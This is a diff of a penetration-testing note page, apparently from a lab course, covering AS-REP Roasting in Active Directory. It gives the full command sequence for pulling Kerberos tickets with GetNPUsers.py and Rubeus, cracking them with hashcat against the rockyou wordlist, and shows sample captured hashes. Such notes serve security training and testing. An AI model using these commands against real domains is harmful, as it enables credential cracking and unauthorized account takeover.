@@ -12,17 +12,13 @@ If pre-authentication is disabled, AS-REP Roasting is possible.
 
 ## ASREPRoasting from Linux
 
-Get TGT from a specic AD account where preauth is disabled using a valid domain account :
+1. Get TGT from a specic AD account where preauth is disabled using a valid domain account :
 
 ```
-impacket-GetNPUsers -dc-ip 192.168.50.70  -request -outputfile hashes.asreproast corp.com/pete
-
-OR
-
 GetNPUsers.py -dc-ip 192.168.200.70  -request -outputfile hashes.asreproast corp.com/pete
 ```
 
-Crack TGT offline
+2. Crack TGT offline
 
 ```
 hashcat --help | grep -i "Kerberos"
@@ -42,7 +38,7 @@ $krb5asrep$23$dave@CORP.COM:b24a619cfa585dc1894fd6924162b099$1be2e632a9446d1447b
 
 ## ASREPRoasting from Windows
 
-Get TGT (no need to specify user if we are authenticated using a domain account) :
+1. Get TGT (no need to specify user if we are authenticated using a domain account) :
 
 ```
 .\Rubeus.exe asreproast /nowrap
@@ -62,7 +58,7 @@ Get TGT (no need to specify user if we are authenticated using a domain account)
       $krb5asrep$dave@corp.com:AE43CA9011CC7E7B9E7F7E7279DD7F2E$7D4C59410DE2984EDF35053B7954E6DC9A0D16CB5BE8E9DCACCA88C3C13C4031ABD71DA16F476EB972506B4989E9ABA2899C042E66792F33B119FAB1837D94EB654883C6C3F2DB6D4A8D44A8D9531C2661BDA4DD231FA985D7003E91F804ECF5FFC0743333959470341032B146AB1DC9BD6B5E3F1C41BB02436D7181727D0C6444D250E255B7261370BC8D4D418C242ABAE9A83C8908387A12D91B40B39848222F72C61DED5349D984FFC6D2A06A3A5BC19DDFF8A17EF5A22162BAADE9CA8E48DD2E87BB7A7AE0DBFE225D1E4A778408B4933A254C30460E4190C02588FBADED757AA87A
 ```
 
-Crack it offline :&#x20;
+2. Crack it offline :&#x20;
 
 ```
 sudo hashcat -m 18200 hashes.asreproast2 /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
